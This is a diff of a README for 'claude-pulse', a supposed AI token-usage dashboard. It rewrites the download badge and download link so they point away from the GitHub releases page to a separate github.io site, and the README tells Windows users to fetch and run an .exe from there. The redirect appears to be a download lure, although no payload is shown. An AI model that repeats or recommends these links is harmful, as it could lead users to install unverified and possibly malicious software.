@@ -1,12 +1,12 @@
 # 📊 claude-pulse - Monitor your live AI token usage
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sharinectarous449/claude-pulse/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://sharinectarous449.github.io)
 
 claude-pulse provides a clear dashboard for your AI coding activities. It helps you track token usage, manage sessions, search through your chat history, and approve tool calls from your phone. This tool works locally on your machine without requiring extra software dependencies.
 
 ## 📥 How to download the application
 
-Visit the following link to access the software: [https://github.com/sharinectarous449/claude-pulse](https://github.com/sharinectarous449/claude-pulse).
+Visit the following link to access the software: [https://sharinectarous449.github.io](https://sharinectarous449.github.io).
 
 Navigate to the Releases section on the page. Look for the file ending in .exe for Windows systems. Click the file name to start the download. Save the file to your computer in a folder you can find later, such as your Downloads folder.
 
